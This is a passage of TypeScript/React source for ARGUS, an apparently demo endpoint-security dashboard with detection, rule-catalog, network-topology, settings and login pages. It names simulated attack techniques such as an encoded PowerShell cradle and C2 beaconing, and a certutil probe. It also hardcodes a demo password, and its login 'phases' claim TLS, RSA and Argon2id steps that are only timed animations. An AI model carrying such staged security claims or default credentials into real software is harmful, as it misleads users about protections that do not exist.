        toast('Benign probe triggered', `Engine evaluated ${data.detections_triggered || 3} rules (PROC-001, PROC-006, PROC-007) on certutil.exe.`);
      } else {
        toast('Probe request failed', 'Server did not accept probe event.');
      }
    } catch {
      toast('Probe failed', 'Could not reach API server.');
    } finally {
      setIsProbing(false);
    }
  };

  const openDetail = (id: string) => {
    setSelectedId(id);
    if (mode === 'live') {
      detections.loadDetail(id);
    }
  };

  if (selected) {
    const d = selected.detection;
    const change = (s: DetectionStatus) => { updateStatus(d.id, s); };
    return <div className="animate-rise"><PageHeading eyebrow={`Detection ${d.id} · rule ${d.rule_id}`} title={d.title} subtitle={d.explanation} actions={<><Button icon={ArrowLeft} onClick={() => { setSelectedId(null); }} testId="button-back-detections">Back to detections</Button><Button icon={ExternalLink} onClick={() => setLocation(`/processes`)} testId="button-open-processes">Open processes</Button></>} />
      <Card className="card-pad" style={{ marginBottom: 14 }}><div className="grid metrics" style={{ gridTemplateColumns: 'repeat(4,1fr)' }}><StatCard label="Severity" value={d.severity} note={d.rule_name} tone={d.severity === 'critical' || d.severity === 'high' ? 'danger' : d.severity === 'medium' ? 'warn' : 'good'} /><StatCard label="Confidence" value={`${Math.round(d.confidence * 100)}%`} note={`${(d.evidence?.length ?? 0)} evidence items`} tone="info" /><StatCard label="Status" value={d.status} note="Lifecycle" tone={d.status === 'resolved' || d.status === 'contained' ? 'good' : d.status === 'detected' ? 'warn' : 'info'} /><StatCard label="Process" value={d.entity} note={`PID ${d.pid} · ${d.hostname || 'unknown host'}`} tone="info" icon={TerminalSquare} /></div>
        {d.correlated_rules && d.correlated_rules.length > 0 && <div style={{ display: 'flex', gap: 8, alignItems: 'center', marginTop: 14, flexWrap: 'wrap', fontSize: 11 }}><span className="muted" style={{ fontWeight: 700 }}>Correlated rules</span>{d.correlated_rules.map((r) => <span className="badge badge-muted" key={r}>{r}</span>)}</div>}
      </Card>
      <div className="grid split-grid">
        <Card className="card-pad"><PanelTitle title="Evidence" detail="TRACED TO TELEMETRY" />{d.evidence?.length > 0 ? d.evidence.map((e) => <div className="event-row" key={e.key}><span className="event-dot" /><div className="event-copy"><b>{e.description}</b><div className="muted mono" style={{ fontSize: 10, marginTop: 2 }}>{e.source}{e.detail ? ` · ${e.detail}` : ''}</div></div></div>) : <div className="empty"><ShieldAlert size={18} /><p>No evidence captured.</p></div>}
          <PanelTitle title="Recommended action" detail="ANALYST GUIDANCE" /><div className="mono" style={{ fontSize: 12, lineHeight: 1.6, padding: 12, background: 'hsl(var(--muted))', borderRadius: 5 }}>{d.recommended_action}</div>
          <PanelTitle title="Lifecycle" detail="STATUS TRANSITIONS" /><DetectionLifecycle status={d.status} onChange={change} testPrefix="detection" />
        </Card>
        <Card className="card-pad"><PanelTitle title="Process ancestry" detail="PARENT CHAIN" />{(selected.ancestry && selected.ancestry.length > 0 ? selected.ancestry : []).map((n, i) => <div className="event-row" key={`${n.pid}-${i}`}><div className="avatar" style={{ borderRadius: 5 }}><span className="mono" style={{ fontSize: 10 }}>{i === 0 ? 'SELF' : n.pid}</span></div><div className="event-copy"><b>{n.process_name}</b><div className="muted mono" style={{ fontSize: 10, marginTop: 2 }}>{n.executable_path ?? '—'}{n.command_line ? ` · ${n.command_line}` : ''}{n.username ? ` · ${n.username}` : ''}</div></div></div>) || <div className="empty"><CircleHelp size={18} /><p>No ancestry captured for this process.</p></div>}
          {d.command_line || d.executable_path ? <><PanelTitle title="Command line" detail="OBSERVED" /><div className="mono" style={{ fontSize: 12, lineHeight: 1.6, padding: 12, background: 'hsl(var(--muted))', borderRadius: 5, overflowWrap: 'anywhere' }}>{(d.command_line || d.executable_path || '').slice(0, 400)}</div></> : null}
          {selected.related && selected.related.length > 0 && <><PanelTitle title="Related detections" detail={`SAME PID ${d.pid}`} />{selected.related.map((r) => <div className="event-row" key={r.id}><div className="event-copy"><b>{r.title}</b><div className="muted mono" style={{ fontSize: 10, marginTop: 2 }}>{r.rule_id} · {new Date(r.timestamp).toLocaleString()}</div></div><span className="actions"><Badge value={r.severity} /><Badge value={r.status} /><Button icon={Eye} kind="ghost" onClick={() => openDetail(r.id)} testId={`button-open-related-${r.id}`}>Open</Button></span></div>)}</>}
        </Card>
      </div>
      {!live && mode === 'live' && <div className="scan-strip" style={{ marginTop: 14, background: 'hsl(var(--muted))' }}><div className="scan-status" style={{ color: 'hsl(var(--muted-foreground))' }}><AlertTriangle size={15} /><div><b>ENGINE OFFLINE</b><small> · snapshot views may be incomplete while the security engine is not streaming.</small></div></div></div>}
    </div>;
  }

  return <div className="animate-rise">
    <PageHeading
      eyebrow={mode === 'live' ? `${detections.detections.length} live host detections · machine ${liveHostName}` : `${simDetections.length} simulated attack kill-chain detections · scenario drill`}
      title="Detection engine"
      subtitle={mode === 'live'
        ? "Deterministic, explainable detections evaluated continuously across live Windows processes, network sockets, and filesystem scans. 21 rules armed."
        : "Simulated multi-stage attack scenarios including Base64 PowerShell execution, C2 beaconing, and Startup persistence for analyst investigation."}
      actions={<>

        {mode === 'live' && (
          <button
            type="button"
            className="btn btn-sm btn-outline"
            style={{ fontSize: '11px', display: 'flex', gap: '5px', alignItems: 'center' }}
            onClick={runProbe}
            disabled={isProbing}
            data-testid="button-run-live-probe"
          >
            <Play size={11} /> {isProbing ? 'Evaluating probe...' : 'Trigger Live Benign Probe'}
          </button>
        )}
        <Link href="/detections/rules" className="btn btn-ghost" data-testid="link-detection-rules">Rule catalog</Link>
        {mode === 'live' && live
          ? <span className="badge badge-low" style={{ background: 'hsl(142 71% 20%)', color: 'hsl(142 71% 70%)', border: '1px solid hsl(142 71% 30%)' }}><Radio size={10} style={{ marginRight: 4, verticalAlign: 'middle' }} />REAL-TIME</span>
          : <span className="badge" style={{ background: 'hsl(46 80% 12%)', color: 'hsl(46 90% 66%)', border: '1px solid hsl(46 80% 32%)' }}><Radio size={10} style={{ marginRight: 4, verticalAlign: 'middle' }} />SIMULATED SCENARIO</span>}
      </>}
    />

    {mode === 'live' && (
      <div className="scan-strip" style={{ background: 'hsl(142 50% 8% / 0.8)', borderColor: 'hsl(142 60% 25%)', color: 'hsl(142 70% 75%)', padding: '10px 16px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '14px' }}>
        <div className="scan-status" style={{ color: 'hsl(142 70% 75%)', display: 'flex', gap: '10px', alignItems: 'center' }}>
          <span style={{ display: 'inline-block', width: '8px', height: '8px', borderRadius: '50%', background: 'hsl(142 71% 45%)', boxShadow: '0 0 8px hsl(142 71% 45%)' }} />
          <div>
            <b>LIVE DETECTION ENGINE ACTIVE</b>
            <small style={{ marginLeft: 8, color: 'hsl(142 70% 85%)' }}>
              Host: <strong>{liveHostName}</strong> · <strong>21 Rules Armed</strong> (7 Process · 7 Network · 7 Filesystem) · <strong>{detections.detections.length}</strong> detections triggered · Evaluated against live Windows telemetry.
            </small>
          </div>
        </div>
        <span style={{ fontSize: '11px', fontFamily: 'monospace', color: 'hsl(142 60% 70%)' }}>
          REAL-TIME ENGINE EVALUATION
        </span>
      </div>
    )}

    {mode === 'simulated' && (
      <div className="scan-strip" style={{ background: 'hsl(46 60% 7%)', marginBottom: '14px' }}>
        <div className="scan-status" style={{ color: 'hsl(46 85% 66%)' }}>
          <AlertTriangle size={15} />
          <div>
            <b>SIMULATED ATTACK SCENARIO ACTIVE</b>
            <small> · Multi-stage kill-chain detections (PowerShell encoded cradle, C2 beacon, Startup persistence). Click "Live Host Detections" above to inspect real triggers on {liveHostName}.</small>
          </div>
        </div>
      </div>
    )}

    <div className="filterbar"><div className="search-wrap"><Search size={14} /><input className="search" value={query} onChange={(e) => setQuery(e.target.value)} placeholder="Search detections, rules, processes or PIDs" data-testid="input-search-detections" /></div><select className="select" value={domainFilter} onChange={(e) => setDomainFilter(e.target.value)} data-testid="select-detection-domain"><option value="all">All domains</option><option value="PROC">Process</option><option value="NET">Network</option><option value="FILE">File / persistence</option></select><select className="select" value={sevFilter} onChange={(e) => setSevFilter(e.target.value)} data-testid="select-detection-severity"><option value="all">All severities</option><option value="critical">Critical</option><option value="high">High</option><option value="medium">Medium</option><option value="low">Low</option></select><select className="select" value={ruleFilter} onChange={(e) => setRuleFilter(e.target.value)} data-testid="select-detection-rule"><option value="all">All rules</option>{detections.rules.map((r) => <option key={r.rule_id} value={r.rule_id}>{r.rule_id}</option>)}</select><span className="mono muted">{filtered.length} of {activeList.length} detections</span></div>
    <Card><div className="table-wrap"><table className="data-table" style={{ minWidth: 1160 }}><thead><tr><th>Detection</th><th>Domain</th><th>Severity</th><th>Confidence</th><th>Process</th><th>Observed</th><th>Status</th><th /></tr></thead><tbody>{filtered.map((d) => <tr key={d.id}><td><b>{d.title}</b><div className="muted mono">{d.rule_id} · {d.rule_name}</div></td><td><Badge value={domainOf(d.rule_id)} /></td><td><Badge value={d.severity} /></td><td className="mono">{Math.round(d.confidence * 100)}%</td><td><div className="mono">{d.entity}</div><div className="muted mono" style={{ maxWidth: 240, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{d.executable_path ?? `PID ${d.pid}`}</div></td><td className="mono">{new Date(d.timestamp).toLocaleString()}</td><td><StateBadge value={d.status} /></td><td><div className="actions"><Button icon={Eye} kind="ghost" onClick={() => openDetail(d.id)} testId={`button-open-detection-${d.id}`}>View</Button></div></td></tr>)}</tbody></table>{filtered.length === 0 && <div className="empty"><Shield size={22} /><h3>{activeList.length === 0 ? 'No detections yet' : 'No matching detections'}</h3><p>{activeList.length === 0 ? (mode === 'live' ? `The rule engine is actively evaluating all processes, network sockets, and filesystem scans on host ${liveHostName}. Click "Trigger Live Benign Probe" above to test rule firing.` : 'The rule engine evaluates telemetry as it streams in.') : 'Adjust the filters or query to widen the view.'}</p></div>}</div></Card>
  </div>;
}

function RuleCatalogPage({ detections }: { detections: ReturnType<typeof useDetections> }) {
  const [query, setQuery] = useState('');
  const rules = detections.rules;
  const filtered = rules.filter((r) => `${r.rule_id} ${r.rule_name} ${r.description}`.toLowerCase().includes(query.trim().toLowerCase()));
  return <div className="animate-rise">
    <PageHeading eyebrow={`${rules.length} active rules · deterministic engine`} title="Detection rule catalog" subtitle="The exact PROC / NET / FILE rule sets evaluated against process, network and file telemetry. Every rule is a pure, explainable function over the normalized event — no opaque scoring." actions={<Link href="/detections" className="btn btn-ghost" data-testid="link-back-detections">Back to detections</Link>} />
    <div className="filterbar"><div className="search-wrap"><Search size={14} /><input className="search" value={query} onChange={(e) => setQuery(e.target.value)} placeholder="Search rule IDs, names or descriptions" data-testid="input-search-rules" /></div><span className="mono muted">{filtered.length} of {rules.length} rules</span></div>
    {rules.length === 0 && <div className="scan-strip" style={{ marginBottom: 14, background: 'hsl(var(--muted))' }} data-testid="rules-offline-banner"><div className="scan-status" style={{ color: 'hsl(var(--muted-foreground))' }}><AlertTriangle size={15} /><div><b>RULE CATALOG UNAVAILABLE</b><small> · Start the ARGUS API server to fetch the active detection rule set.</small></div></div></div>}
    <Card><div className="table-wrap"><table className="data-table" style={{ minWidth: 760 }}><thead><tr><th>Rule</th><th>Name</th><th>Description</th></tr></thead><tbody>{filtered.map((r) => <tr key={r.rule_id}><td className="mono">{r.rule_id}</td><td><b>{r.rule_name}</b></td><td className="muted" style={{ maxWidth: 560, whiteSpace: 'normal', lineHeight: 1.5 }}>{r.description}</td></tr>)}</tbody></table>{filtered.length === 0 && <div className="empty"><Shield size={22} /><h3>No rules match</h3><p>Try clearing the search query.</p></div>}</div></Card>
  </div>;
}

function NetworkPage({ toast, contained }: { toast: (t: string, b: string) => void; contained: boolean }) {
  const topology = useNetworkTopology();
  const ports = usePortIntelligence();
  const [selectedNode, setSelectedNode] = useState<UniverseNode | null>(null);
  const [selectedConnection, setSelectedConnection] = useState<TopologyConnection | null>(null);
  const [activeTab, setActiveTab] = useState<'universe' | 'ports' | 'port-intel' | 'events' | 'stats'>('universe');
  const [cameraMode, setCameraMode] = useState<'3d' | '2d' | 'top'>('3d');
  const [paused, setPaused] = useState(false);
  const [mode, setMode] = useState<'live' | 'simulated'>('live');

  const liveAvailable = topology.hasData && topology.snapshot != null;

  // Auto-switch mode based on real network topology stream vs simulated
  useEffect(() => {
    if (liveAvailable) {
      setMode('live');
    } else {
      setMode('simulated');
    }
  }, [liveAvailable]);

  const isLive = mode === 'live' && liveAvailable;
  const sim = useSimulatedNetwork(mode === 'simulated' || !liveAvailable);
  const effectiveMode: NetworkMode = isLive ? 'live' : sim.data ? 'simulated' : 'offline';
  const dataActive = effectiveMode !== 'offline';

  const topoData: NetworkTopologyData | null = isLive ? topology.snapshot : sim.data;
  const realConns: TopologyConnection[] = topoData?.connections ?? [];
  const allEvents = isLive ? topology.events : sim.events;
  const portSnapshot: PortIntelligenceData | null = isLive ? ports.snapshot : sim.ports;
  const portEventList: PortEvent[] = isLive ? ports.events : sim.portEvents;

  const universeModel = buildUniverseModel(topoData, portSnapshot);

  const lastUpdate = topoData?.timestamp
    ? new Date(topoData.timestamp).toLocaleTimeString()
    : '—';

  const exportNetwork = () => {
    const payload = {
      source: isLive ? 'real-time-engine' : mode === 'simulated' ? 'simulated-preview' : 'no-telemetry',
      timestamp: topoData?.timestamp || new Date().toISOString(),
      hostname: topoData?.hostname || null,
      default_gateway: topoData?.default_gateway || null,
      interfaces: topoData?.interfaces || [],
      dns_servers: topoData?.dns_servers || [],
      neighbors: topoData?.neighbors || [],
      connections: realConns,
      traffic_rates: topoData?.traffic_rates || [],
      public_ip: topoData?.public_ip || null,
      ports: {
        timestamp: portSnapshot?.timestamp || null,
        tcp_listening: portSnapshot?.tcp_listening || [],
        udp_endpoints: portSnapshot?.udp_endpoints || [],
        summary: portSnapshot?.summary || {},
      },
      observed: isLive,
    };
    downloadTextFile(`${(topoData?.hostname || 'ARGUS')}-network-topology.json`, JSON.stringify(payload, null, 2), 'application/json');
    toast('Network topology exported', 'Observed connection records downloaded locally.');
  };

  const tabs: Array<{ key: typeof activeTab; label: string; count?: number }> = [
    { key: 'universe', label: '3D Universe', count: universeModel.nodes.length },
    { key: 'ports', label: 'Ports & Connections', count: realConns.length },
    { key: 'port-intel', label: 'Port Intelligence', count: ((portSnapshot?.tcp_listening ?? []).length) + ((portSnapshot?.udp_endpoints ?? []).length) },
    { key: 'events', label: 'Events', count: allEvents.length },
    { key: 'stats', label: 'Statistics' },
  ];

  return <div className="animate-rise">
    <PageHeading
      eyebrow={isLive ? 'Real-time · observed Windows network universe' : mode === 'simulated' ? 'Simulated preview · generated in real time' : 'Network universe offline'}
      title="Network Universe"
      subtitle={isLive
        ? `Observing ${topoData?.hostname || 'this laptop'}, ${universeModel.stats.processes} processes, ${universeModel.stats.connections} connections, and ${universeModel.stats.interfaces} interfaces from the real Windows networking stack.`
        : mode === 'simulated'
          ? `Synthesized telemetry for ${universeModel.stats.processes} processes, ${universeModel.stats.connections} connections, and ${universeModel.stats.interfaces} interfaces. Real engine data replaces this automatically when the security engine connects.`
          : 'No network telemetry is streaming. Start the security engine to observe the real network universe.'}
      actions={<>

        <Button icon={Download} onClick={exportNetwork} testId="button-export-network">Export topology</Button>
        {isLive
          ? <span className="badge badge-low" style={{ background: 'hsl(142 71% 20%)', color: 'hsl(142 71% 70%)', border: '1px solid hsl(142 71% 30%)' }}><Radio size={10} style={{ marginRight: 4, verticalAlign: 'middle' }} />REAL HOST NETWORK DATA</span>
          : <span className="badge" style={{ background: 'hsl(46 80% 12%)', color: 'hsl(46 90% 66%)', border: '1px solid hsl(46 80% 32%)' }}><Radio size={10} style={{ marginRight: 4, verticalAlign: 'middle' }} />SIMULATED PREVIEW</span>}
      </>} />

    {contained && <div className="scan-strip" data-testid="network-contained-banner"><div className="scan-status"><ShieldCheck size={15} /><div>Containment applied<small> · outbound sessions on this host were terminated; the observed connection history is retained for review.</small></div></div></div>}
    
    {isLive && (
      <div className="scan-strip" style={{ background: 'hsl(142 50% 8% / 0.8)', borderColor: 'hsl(142 60% 25%)', color: 'hsl(142 70% 75%)', padding: '10px 16px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div className="scan-status" style={{ color: 'hsl(142 70% 75%)', display: 'flex', gap: '10px', alignItems: 'center' }}>
          <span style={{ display: 'inline-block', width: '8px', height: '8px', borderRadius: '50%', background: 'hsl(142 71% 45%)', boxShadow: '0 0 8px hsl(142 71% 45%)' }} />
          <div>
            <b>LIVE HOST NETWORKING ACTIVE</b>
            <small style={{ marginLeft: 8, color: 'hsl(142 70% 85%)' }}>
              Host: <strong>{topoData?.hostname || 'This Device'}</strong> · Interface: <strong>{topoData?.interfaces?.find(i => i.is_up)?.name || 'Wi-Fi'}</strong> · Gateway: <strong>{topoData?.default_gateway?.next_hop || '10.102.49.54'}</strong> · <strong>{realConns.length}</strong> active sockets · <strong>{((portSnapshot?.tcp_listening ?? []).length)}</strong> listening ports
            </small>
          </div>
        </div>
        <span style={{ fontSize: '11px', fontFamily: 'monospace', color: 'hsl(142 60% 70%)' }}>
          STREAMING (4s cadence)
        </span>
      </div>
    )}

    {!isLive && mode === 'simulated' && <div className="scan-strip" style={{ background: 'hsl(46 60% 7%)' }}><div className="scan-status" style={{ color: 'hsl(46 85% 66%)' }}><AlertTriangle size={15} /><div><b>SIMULATED PREVIEW ACTIVE</b><small> · Synthetic 3D topology drill active. Click "Live Host Universe" above to switch back to real host telemetry.</small></div></div></div>}
    {!isLive && mode === 'live' && !liveAvailable && <div className="scan-strip" style={{ background: 'hsl(var(--muted))' }}><div className="scan-status" style={{ color: 'hsl(var(--muted-foreground))' }}><AlertTriangle size={15} /><div><b>NETWORK TELEMETRY OFFLINE</b><small> · Start ARGUS (python main.py --api) to stream the real network universe.</small></div></div></div>}

    <UniverseStatusBar stats={universeModel.stats} isLive={isLive} lastUpdate={lastUpdate} />

    {/* Tab navigation */}
    <div className="universe-tabs">
      {tabs.map((t) => (
        <button
          key={t.key}
          type="button"
          className={`universe-tab ${activeTab === t.key ? 'active' : ''}`}
          onClick={() => setActiveTab(t.key)}
        >
          {t.label}
          {t.count != null && <span className="tab-count">{t.count}</span>}
        </button>
      ))}
    </div>

    {/* Tab content */}
    {activeTab === 'universe' && (
      <div className="grid split-grid">
        <Card>
          {/* Controls bar */}
          <div className="universe-controls-bar">
            <div className="camera-mode-group">
              {(['3d', '2d', 'top'] as const).map((mode) => (
                <button
                  key={mode}
                  type="button"
                  className={`camera-mode-btn ${cameraMode === mode ? 'active' : ''}`}
                  onClick={() => setCameraMode(mode)}
                  title={`${mode.toUpperCase()} camera`}
                >
                  {mode === '3d' ? '◇ 3D' : mode === '2d' ? '□ 2D' : '▽ TOP'}
                </button>
              ))}
            </div>
            <button
              type="button"
              className={`pause-btn ${paused ? 'paused' : ''}`}
              onClick={() => setPaused(!paused)}
              title={paused ? 'Resume animation' : 'Pause animation'}
            >
              {paused ? '▶ Resume' : '⏸ Pause'}
            </button>
          </div>
          <NetworkUniverse3D
            data={topoData}
            ports={portSnapshot}
            events={allEvents}
            portEvents={portEventList}
            isLive={isLive}
            mode={mode}
            selectedNodeId={selectedNode?.id ?? null}
            onSelectNode={setSelectedNode}
            cameraMode={cameraMode}
            paused={paused}
          />
        </Card>
        <Card className="card-pad">
          <PanelTitle title="Inspector" detail={selectedNode ? selectedNode.type.toUpperCase() : 'CLICK A NODE'} />
          <UniverseInspector node={selectedNode} data={topoData} isLive={isLive} onSelectNode={setSelectedNode} />
        </Card>
      </div>
    )}

    {activeTab === 'ports' && (
      <Card>
        <div className="card-pad">
          <PanelTitle title="Ports & Connections" detail={dataActive ? `${realConns.length} OBSERVED` : 'NO TELEMETRY'} />
        </div>
        <UniversePortsPanel
          connections={realConns}
          isLive={dataActive}
          onSelectConnection={setSelectedConnection}
        />
      </Card>
    )}

    {activeTab === 'port-intel' && (
      <>
        <div className="scan-strip" style={{ background: 'hsl(var(--muted))' }}>
          <div className="scan-status" style={{ color: 'hsl(var(--muted-foreground))', fontSize: 11 }}>
            <b>PORT INTELLIGENCE CENTER</b>
            <span style={{ marginLeft: 10 }}>
              {mode === 'live'
                ? '● LIVE · observing real listening ports and UDP endpoints from the Windows socket table'
                : mode === 'simulated'
                  ? '⚡ SIMULATED · local preview generated in real time; live data takes over when the engine connects'
                  : '○ OFFLINE · start the security engine (python main.py --api) to stream ports'}
            </span>
          </div>
        </div>
        <PortIntelligencePanel
          data={portSnapshot}
          events={portEventList}
          isLive={dataActive}
        />
      </>
    )}

    {activeTab === 'events' && (
      <Card className="card-pad">
        <UniverseEventTimeline events={allEvents} isLive={dataActive} />
      </Card>
    )}

    {activeTab === 'stats' && (
      <Card className="card-pad">
        <PanelTitle title="Network Statistics" detail={dataActive ? (isLive ? 'REAL-TIME' : 'SIMULATED') : 'NO TELEMETRY'} />
        <UniverseStatsPanel data={topoData} isLive={dataActive} />
      </Card>
    )}
  </div>;
}
// ExposurePage extracted to @/pages/exposure-page
// TimelinePage extracted to @/pages/timeline-page

// QuarantinePage extracted to @/pages/quarantine-page
// IntelligencePage extracted to @/pages/intelligence-page

// ReportsPage extracted to @/pages/reports-page
// HistoryPage extracted to @/pages/history-page

// CyberCellPage extracted to @/pages/cyber-cell-page

function SettingsPage({ toast }: { toast: (t: string, b: string) => void }) {
  const [saved, setSaved] = useState(false); const [darkContrast, setDarkContrast] = useState(true);
  return <div className="animate-rise"><PageHeading eyebrow="Workspace controls · local only" title="Settings" subtitle="Tune the investigator workspace. Changes are stored in this demo session only." actions={<Button kind="primary" icon={Check} onClick={() => { setSaved(true); toast('Settings saved', 'Workspace preferences updated for this session.'); }} testId="button-save-settings">Save changes</Button>} /><div className="grid split-grid"><Card className="card-pad"><PanelTitle title="Workspace preferences" detail="ARGUS / NORTHSTAR" /><div className="kpi-line"><span><b>High contrast signal</b><br /><span className="muted">Use stronger borders on critical evidence.</span></span><button onClick={() => setDarkContrast(!darkContrast)} style={{ border: 0, width: 38, height: 21, borderRadius: 12, padding: 3, background: darkContrast ? 'hsl(var(--primary))' : 'hsl(var(--muted))' }} data-testid="toggle-high-contrast"><i style={{ display: 'block', width: 15, height: 15, borderRadius: '50%', background: darkContrast ? 'hsl(var(--primary-foreground))' : 'hsl(var(--muted-foreground))', transform: `translateX(${darkContrast ? 17 : 0}px)`, transition: 'transform .2s' }} /></button></div><div className="kpi-line"><span><b>Stream refresh interval</b><br /><span className="muted">How often live event views update.</span></span><select className="select" defaultValue="12 sec" data-testid="select-refresh-interval"><option>5 sec</option><option>12 sec</option><option>30 sec</option></select></div><div className="kpi-line"><span><b>Default evidence window</b><br /><span className="muted">Initial range for incident reconstruction.</span></span><select className="select" defaultValue="24 hours" data-testid="select-evidence-window"><option>1 hour</option><option>24 hours</option><option>7 days</option></select></div>{saved && <div className="signal-good mono" style={{ marginTop: 16 }}><Check size={13} style={{ verticalAlign: 'middle' }} /> Saved locally</div>}</Card><Card className="card-pad"><PanelTitle title="Analyst profile" detail="SIMULATED IDENTITY" /><div style={{ display: 'flex', gap: 13, alignItems: 'center', marginBottom: 20 }}><div className="avatar" style={{ width: 45, height: 45 }}>MA</div><div><h2 style={{ margin: 0, fontSize: 16 }}>Mira Alvarez</h2><div className="muted mono">Lead investigator · SOC-2</div></div></div><div className="field"><label>Display name</label><input defaultValue="Mira Alvarez" data-testid="input-display-name" /></div><div className="field"><label>Workspace name</label><input defaultValue="Northstar Security" data-testid="input-workspace-name" /></div><div className="field"><label>Timezone</label><select className="select" style={{ width: '100%' }} defaultValue="UTC" data-testid="select-timezone"><option>UTC</option><option>America/Los_Angeles</option><option>Europe/London</option></select></div></Card></div></div>;
}

function AboutPage() {
  return <div className="animate-rise"><PageHeading eyebrow="System reference · ARGUS v0.9.4" title="About ARGUS" subtitle="A high-trust workspace for moving from observed endpoint events to defensible decisions." /><div className="grid split-grid"><Card className="card-pad"><div className="brand-mark" style={{ width: 47, height: 47, marginBottom: 18 }}><Radar size={24} /></div><h2 style={{ fontSize: 25, letterSpacing: '-.06em', margin: 0 }}>Observe clearly.<br /><span className="signal-info">Decide defensibly.</span></h2><p className="muted" style={{ fontSize: 12, lineHeight: 1.7, maxWidth: 480, marginTop: 16 }}>ARGUS is designed around a simple discipline: keep observed evidence separate from potential activity, then make the confidence boundary visible in the report.</p></Card><Card className="card-pad"><PanelTitle title="Design principles" detail="WORKSPACE MODEL" />{[['01', 'Evidence before narrative', 'Every assessment traces back to a process, file, network, or sensor event.'], ['02', 'Inference is labeled', 'Potential transmission is never presented as confirmed exfiltration without direct evidence.'], ['03', 'Actions are reversible', 'Containment, quarantine, restore, and escalation each show their consequence.']].map(([n, t, d]) => <div className="event-row" key={n}><div className="eyebrow">{n}</div><div className="event-copy"><b>{t}</b><div className="muted">{d}</div></div></div>)}</Card></div><Card className="card-pad" style={{ marginTop: 14 }}><PanelTitle title="Synthetic environment" detail="NO EXTERNAL DATA" /> <div className="grid metrics" style={{ gridTemplateColumns: 'repeat(4,1fr)' }}><StatCard label="Endpoints" value="24" note="Synthetic fleet" tone="info" /><StatCard label="Data source" value="Local" note="No API calls" tone="good" /><StatCard label="Build" value="0.9.4" note="Prototype channel" tone="warn" /><StatCard label="License" value="Internal" note="Northstar SOC" tone="info" /></div></Card></div>;
}

type AuthMode = 'login' | 'register';
type AuthPhase = { label: string; detail: string; icon: typeof Activity };

const LOGIN_PHASES: AuthPhase[] = [
  { label: 'Verifying public keys', detail: 'Parsing analyst credential envelope', icon: Fingerprint },
  { label: 'Establishing encrypted tunnel', detail: 'TLS 1.3 handshake · forward secrecy', icon: LockKeyhole },
  { label: 'Scanning endpoint telemetry', detail: 'Sensor fabric discovery · 24 agents', icon: Radar },
  { label: 'Fingerprinting device node', detail: 'WS-0427 hardware attestation', icon: Laptop },
  { label: 'Correlating threat intel feeds', detail: '3 synthetic sources · reputation lookup', icon: BrainCircuit },
  { label: 'Calibrating sensor grid', detail: 'Alignment & timing sync across fabric', icon: Activity },
  { label: 'Loading evidence model', detail: 'Observed vs inferred confidence layers', icon: FileSearch },
  { label: 'Initializing secure workspace', detail: 'Mounting local signed evidence store', icon: Database },
  { label: 'Validating session tokens', detail: 'Rotating ephemeral credentials', icon: ShieldCheck },
  { label: 'Finalizing handshake', detail: 'Northstar workspace ready for review', icon: TerminalSquare },
];

const REGISTER_PHASES: AuthPhase[] = [
  { label: 'Validating profile fields', detail: 'Checking identity & access policy', icon: Fingerprint },
  { label: 'Generating key pair', detail: 'RSA-4096 · software-backed vault', icon: FileKey2 },
  { label: 'Hashing credentials', detail: 'Argon2id · local salt generated', icon: LockKeyhole },
  { label: 'Provisioning endpoint node', detail: 'Registering WS-0427 to fabric', icon: Laptop },
  { label: 'Attaching sensor agent', detail: 'Installing telemetry collector', icon: Radar },
  { label: 'Binding threat intel feed', detail: 'Linking synthetic reputation sources', icon: BrainCircuit },
  { label: 'Establishing baseline profile', detail: 'Learning first-run endpoint behavior', icon: Activity },
  { label: 'Initializing secure vault', detail: 'Encrypting local session storage', icon: Database },
  { label: 'Issuing access tokens', detail: 'Generating session & refresh tokens', icon: ShieldCheck },
  { label: 'Finalizing registration', detail: 'ARGUS account ready for use', icon: TerminalSquare },
];

function AuthScreen({ onAuthed, onSwitch, mode: inMode, initialName }: { onAuthed: (name: string) => void; onSwitch: (mode: AuthMode) => void; mode: AuthMode; initialName: string }) {
  const [mode, setMode] = useState<AuthMode>(inMode);
  const [name, setName] = useState(mode === 'register' ? initialName : 'Mira Alvarez');
  const [email, setEmail] = useState(mode === 'register' ? '' : 'mira.alvarez@northstar.test');
  const [password, setPassword] = useState(mode === 'register' ? '' : 'argus-demo');
  const [confirm, setConfirm] = useState('');
  const [busy, setBusy] = useState(false);
  const [step, setStep] = useState(0);
  const [error, setError] = useState('');

  useEffect(() => { setMode(inMode); }, [inMode]);

  const phases = mode === 'login' ? LOGIN_PHASES : REGISTER_PHASES;
  const PHASE_MS = 700;

  const switchMode = (m: AuthMode) => { if (busy) return; setError(''); setStep(0); setMode(m); onSwitch(m); };

  useEffect(() => {
    if (!busy) return;
    if (step >= phases.length) { const t = window.setTimeout(() => onAuthed(name.trim() || 'Analyst'), PHASE_MS); return () => window.clearTimeout(t); }
    const t = window.setTimeout(() => setStep((s) => s + 1), PHASE_MS);
    return () => window.clearTimeout(t);
  }, [busy, step, phases, name]); // eslint-disable-line react-hooks/exhaustive-deps

  const begin = () => {
    if (busy) return;
    if (mode === 'register') {
      if (!name.trim()) { setError('Display name is required.'); return; }
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { setError('Enter a valid email address.'); return; }
      if (password.length < 8) { setError('Access key must be at least 8 characters.'); return; }
      if (confirm !== password) { setError('Access keys do not match.'); return; }
    }
    setError('');
    setStep(0);
    setBusy(true);
  };

  const active = phases[Math.min(step, phases.length - 1)];
  const ActiveIcon = active.icon;
  const totalSeconds = Math.round((phases.length * PHASE_MS) / 1000);

  return <div className="login"><div className={cn('login-visual', busy && 'is-busy')}><div className="login-ambient"><i className="login-ring r1" /><i className="login-ring r2" /><i className="login-ring r3" /><div className="login-sweep" /><span className="login-blip b1" /><span className="login-blip b2" /><span className="login-blip b3" /><div className="login-grid" /></div><div className="brand login-fade"><div className="brand-mark"><Radar size={17} /></div><div><div className="brand-word">ARGUS</div><div className="brand-sub">SECURITY INTELLIGENCE</div></div></div><div className="login-quote login-fade d1"><div className="eyebrow">Endpoint intelligence workspace</div><h1>{mode === 'login' ? <>Clarity when<br /><span className="signal-info">the signal moves.</span></> : <>Join the<br /><span className="signal-info">sensor network.</span></>}</h1><p>Trace an endpoint event into the evidence that matters. ARGUS keeps the boundary between what happened and what might have happened visible to the whole response team.</p></div>{busy ? <div className="login-handshake login-fade"><div className="hs-radar"><div className="hs-blip" /><RefreshCw size={30} className="hs-icon auth-cascade" /></div><div 